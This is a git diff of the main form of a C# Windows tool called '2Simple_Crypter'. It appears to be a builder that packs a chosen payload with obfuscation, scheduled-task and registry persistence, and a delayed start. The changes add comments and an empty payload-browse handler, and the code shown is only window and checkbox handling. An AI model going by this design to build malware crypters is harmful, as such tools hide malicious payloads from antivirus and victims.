@@ -12,6 +12,7 @@ namespace _2Simple_Crypter
 {
     public partial class MainFrm : Form
     {
+        // Needed for moving window
         bool mouseDown;
         private Point offset;
 
@@ -20,8 +21,10 @@ namespace _2Simple_Crypter
             InitializeComponent();
         }
 
-
         #region Panels
+        /// <summary>
+        /// This region is responsible for moving panel and window
+        /// </summary>
 
         private void topPanel_MouseUp(object sender, MouseEventArgs e)
         {
@@ -44,21 +47,44 @@ namespace _2Simple_Crypter
             offset.Y = e.Y;
             mouseDown = true;
         }
-
         #endregion
 
         #region Buttons
+
+        /// <summary>
+        /// In this region there is a code that is responsible for:
+        ///  - Exit and Minimize button
+        ///  - Browse payload, which as the name suggests, chooses payload
+        ///  - Assembly button, which changes assembly of built file
+        ///  - Build button, which builds our payload
+        /// </summary>
+
+        // Exit application
         private void exitBox_Click(object sender, EventArgs e)
         {
             Application.Exit();
         }
 
+        // Minimize window
         private void minimizeBox_Click(object sender, EventArgs e)
         {
             this.WindowState = FormWindowState.Minimized;
         }
+
+        // Browse payload
+        private void browsePayloadBtn_Click(object sender, EventArgs e)
+        {
+
+        }
         #endregion
 
+        #region Code
+
+        /// <summary>
+        /// This region contains the code, mostly needed for the UI but also stuff like obfuscate
+        /// </summary>
+       
+        // Enables/Disables textboxes, comboboxes etc. for schtasks
         private void schtasksBox_CheckedChanged(object sender, EventArgs e)
         {
             if (schtasksChk.Checked)
@@ -83,6 +109,7 @@ namespace _2Simple_Crypter
             }
         }
 
+        // Enables/Disables textboxes, comboboxes etc. for regedit
         private void regeditChk_CheckedChanged(object sender, EventArgs e)
         {
             if (regeditChk.CheckState == CheckState.Checked)
@@ -107,6 +134,7 @@ namespace _2Simple_Crypter
             }
         }
 
+        // Enables/Disables numericupsidedown for execution delay
         private void sleepChk_CheckedChanged(object sender, EventArgs e)
         {
             if(sleepChk.CheckState == CheckState.Checked)
@@ -118,5 +146,7 @@ namespace _2Simple_Crypter
                 sleepNum.Enabled = false;
             }
         }
+
+        #endregion
     }
 }
